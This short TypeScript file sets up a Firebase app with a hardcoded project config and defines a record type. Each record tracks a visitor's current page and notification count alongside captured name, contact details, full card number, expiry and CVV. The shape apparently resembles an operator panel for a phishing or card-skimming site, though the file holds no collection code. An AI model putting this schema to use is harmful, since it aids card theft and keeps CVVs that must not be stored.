import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDKv0L5VjPP7oD12Cwk6zA15-GGBpY-tPs",
  authDomain: "mmdm-6fb93.firebaseapp.com",
  projectId: "mmdm-6fb93",
  storageBucket: "mmdm-6fb93.firebasestorage.app",
  messagingSenderId: "657145391802",
  appId: "1:657145391802:web:aa2ef55a0b9d41d9e17083",
  measurementId: "G-8J5VLQMT5P"};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


